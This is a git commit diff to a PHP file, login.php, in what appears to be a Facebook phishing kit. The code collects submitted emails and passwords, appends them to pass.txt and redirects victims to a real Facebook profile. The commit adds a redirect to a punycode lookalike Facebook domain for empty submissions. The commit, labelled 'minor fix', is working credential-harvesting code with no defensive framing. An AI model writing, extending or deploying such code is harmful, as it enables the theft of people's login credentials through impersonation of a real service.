bb6f01eaa05d90f78a910c6bb67ac0b186cbecb3
Sandeep <sankmr76@gmail.com>
2019-04-05 04:27:43 +0530

    minor fix

--- login.php
+++ login.php
@@ -2,11 +2,16 @@
 require "pass.txt";
 $email = $_POST['email'];
 $pass = $_POST['pass'];
-$email = $email;
-$pass = $pass;
-$sep = "*********************\n";
-file_put_contents('pass.txt', $email.PHP_EOL , FILE_APPEND | LOCK_EX);
-file_put_contents('pass.txt', $pass.PHP_EOL , FILE_APPEND | LOCK_EX);
-file_put_contents('pass.txt', $sep.PHP_EOL , FILE_APPEND | LOCK_EX);
-header('Location: https://www.facebook.com/profile.php?id=100028070380145');
+if(empty($email) || empty($pass)){
+    header('Location: https://www.xn--facebok-f1a.co/yashikasingh345/');
+}
+else{
+    $email = $email;
+    $pass = $pass;
+    $sep = "*********************\n";
+    file_put_contents('pass.txt', $email.PHP_EOL , FILE_APPEND | LOCK_EX);
+    file_put_contents('pass.txt', $pass.PHP_EOL , FILE_APPEND | LOCK_EX);
+    file_put_contents('pass.txt', $sep.PHP_EOL , FILE_APPEND | LOCK_EX);
+    header('Location: https://m.facebook.com/profile.php?id=100028070380145');
+}
 ?>
